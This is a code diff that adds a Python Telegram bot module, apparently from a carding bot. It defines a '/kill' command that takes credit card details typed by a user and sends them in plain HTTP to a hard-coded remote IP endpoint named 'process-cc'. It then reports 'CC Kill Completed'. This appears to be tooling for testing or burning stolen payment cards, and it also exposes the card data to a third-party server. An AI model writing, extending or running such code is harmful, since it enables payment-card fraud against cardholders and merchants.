@@ -1,0 +1,41 @@
+import requests
+import telebot
+import asyncio
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import bot  # ✅ Import bot instance from main.py
+
+# ✅ CC Killer API URL
+BASE_URL = "http://108.181.156.139:9300/process-cc?cc="
+
+# ✅ /kill Command
+@bot.message_handler(commands=["kill"])
+def kill_command(message):
+    args = message.text.split(" ", 1)
+    if len(args) < 2:
+        bot.reply_to(message, "⚠️ *Usage:* `/kill <cc_details>`", parse_mode="Markdown")
+        return
+
+    cc_details = args[1]
+    url = BASE_URL + cc_details
+    bot.reply_to(message, "⏳ *Processing...*", parse_mode="Markdown")
+
+    asyncio.run(process_kill(message, url))
+
+# ✅ Async function to process CC kill
+async def process_kill(message, url):
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
+        response_text = response.text.strip()
+    except requests.RequestException as e:
+        response_text = f"❌ Error: {e}"
+
+    message_text = (
+        f"✅ *CC Kill Completed*\n\n"
+        f"🔹 *Response*: `{response_text}`\n"
+    )
+    bot.reply_to(message, message_text, parse_mode="Markdown")
+
+# ✅ Run the bot
+if __name__ == "__main__":
+    print("🤖 Kill module loaded.")
